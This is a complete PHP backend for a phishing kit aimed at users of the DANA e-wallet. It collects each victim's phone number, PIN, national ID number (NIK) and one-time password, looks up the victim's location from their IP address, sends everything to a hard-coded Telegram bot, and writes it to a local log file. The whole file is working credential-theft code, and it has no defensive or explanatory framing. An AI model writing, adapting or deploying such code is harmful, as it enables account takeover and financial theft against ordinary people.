<?php
// KONFIGURASI
$bot_token = "8107021217:AAEButhYwQ64QXNIlwj1pAgQTxMiAJE5LLo";
$chat_id = "6332222449";

// Data dari form
$step = $_POST['step'] ?? '1';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

// Ambil lokasi
$location = @file_get_contents("http://ip-api.com/json/$ip");
$loc = $location ? json_decode($location, true) : [];
$country = $loc['country'] ?? 'Unknown';
$city = $loc['city'] ?? 'Unknown';
$isp = $loc['isp'] ?? 'Unknown';

// Ambil device info dari user agent
$is_mobile = preg_match('/(android|iphone|ipad|mobile)/i', $user_agent);
$device_type = $is_mobile ? '📱 Mobile' : '💻 Desktop';

if($step == '1') {
    $phone = $_POST['phone'] ?? '-';
    $pin = $_POST['pin'] ?? '-';
    $nik = $_POST['nik'] ?? '-';
    
    // Format pesan premium
    $message = "
╔══════════════════════════════════╗
║   🔴 DANA PHISHING ALERT 🔴      ║
╠══════════════════════════════════╣
║ 📍 STEP 1/2 - DATA AWAL
╠══════════════════════════════════╣
║ 📱 No HP: $phone
║ 🔐 PIN: $pin
║ 🆔 NIK: $nik
╠══════════════════════════════════╣
║ 🌐 IP: $ip
║ 🗺️ Lokasi: $city, $country
║ 📡 ISP: $isp
║ 💻 Device: $device_type
║ ⏰ Waktu: $date
╚══════════════════════════════════╝
    ";
    
    // Simpan session
    session_start();
    $_SESSION['phone'] = $phone;
    $_SESSION['nik'] = $nik;
    
} else if($step == '2') {
    $phone = $_POST['phone'] ?? '-';
    $otp = $_POST['otp'] ?? '-';
    
    $message = "
╔══════════════════════════════════╗
║   🟢 DANA PHISHING COMPLETE 🟢   ║
╠══════════════════════════════════╣
║ 📍 STEP 2/2 - OTP CAPTURED
╠══════════════════════════════════╣
║ 📱 No HP: $phone
║ 🔢 KODE OTP: $otp
╠══════════════════════════════════╣
║ 🌐 IP: $ip
║ 🗺️ Lokasi: $city, $country
║ ⏰ Waktu: $date
╠══════════════════════════════════╣
║ ✅ DATA LENGKAP - SIAP DIGUNAKAN
╚══════════════════════════════════╝
    ";
}

// Kirim ke Telegram via curl
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$postData = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Simpan ke JSON
$log_entry = [
    'timestamp' => $date,
    'step' => $step,
    'phone' => $phone ?? '-',
    'pin' => $pin ?? '-',
    'nik' => $nik ?? '-',
    'otp' => $otp ?? '-',
    'ip' => $ip,
    'location' => "$city, $country",
    'isp' => $isp,
    'device' => $device_type,
    'user_agent' => $user_agent
];

$log_file = 'logs.json';
$logs = file_exists($log_file) ? json_decode(file_get_contents($log_file), true) : [];
array_unshift($logs, $log_entry);
file_put_contents($log_file, json_encode($logs, JSON_PRETTY_PRINT));

echo json_encode(['status' => 'success']);
?>